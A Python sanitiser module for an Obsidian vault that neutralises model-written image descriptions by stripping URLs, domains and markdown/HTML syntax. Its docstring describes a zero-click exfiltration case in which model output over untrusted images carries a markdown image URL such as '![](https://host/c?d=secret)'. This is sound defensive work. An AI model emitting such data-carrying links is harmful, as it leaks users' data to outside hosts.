"""Text derived from untrusted content, made safe to write into the vault (spec 021 safety review).

An image description is model output over untrusted pixels. Written into a note as it is, a markdown
image (``![](https://host/c?d=secret)``), a link, a wikilink or embed (``![[...]]``), an HTML tag or a bare
URL makes Obsidian fetch a remote image or open something: a zero-click way to send data out. So every such
field is neutralised on the write path: URLs and domains become a placeholder, and the characters that open
markdown or HTML syntax (``[ ] < >`` and the backtick) are dropped.
"""

from __future__ import annotations

import re

PLACEHOLDER = "(url)"
_SCHEME_URL = re.compile(
    r"(?i)(?://)?\b(?:[a-z][a-z0-9+.-]*://|(?:javascript|data|file|vbscript|mailto|blob):)\S*|//[a-z0-9-]+\.\S*"
)
_DOMAIN = re.compile(r"(?i)\b(?:www\.)?(?:[a-z0-9-]+\.)+[a-z]{2,}(?::\d+)?(?:/\S*)?")
_SYNTAX = re.compile(r"[\[\]<>`]|!(?=\s|$)")
_MAX = 200


def neutralize_text(text: object, limit: int = _MAX) -> str:
    """One line, URLs and domains replaced, markdown and HTML openers removed, at most ``limit``."""
    out = _SCHEME_URL.sub(PLACEHOLDER, str(text))
    out = _DOMAIN.sub(PLACEHOLDER, out)
    out = _SYNTAX.sub("", out)
    return " ".join(out.split())[:limit]
